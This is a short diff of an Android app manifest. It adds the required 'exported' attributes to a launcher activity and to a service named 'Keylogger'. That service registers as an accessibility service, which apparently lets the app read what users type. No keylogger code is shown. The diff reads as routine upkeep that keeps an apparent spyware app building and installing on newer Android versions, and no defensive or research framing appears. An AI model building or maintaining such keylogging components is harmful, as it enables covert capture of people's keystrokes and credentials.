@@ -7,18 +7,25 @@
         android:label="@string/app_name"
         android:supportsRtl="true"
         android:theme="@style/Theme.DynamicAPK">
-        <activity android:name=".MainActivity">
+        
+        <activity 
+            android:name=".MainActivity"
+            android:exported="true"> <!-- Required for activities with intent filters -->
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-        <service android:name=".Keylogger"
+        
+        <service 
+            android:name=".Keylogger"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:label="@string/accessibility_service_label">
+            android:label="@string/accessibility_service_label"
+            android:exported="false"> <!-- Set to false to restrict external access -->
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
         </service>
+        
     </application>
 </manifest>
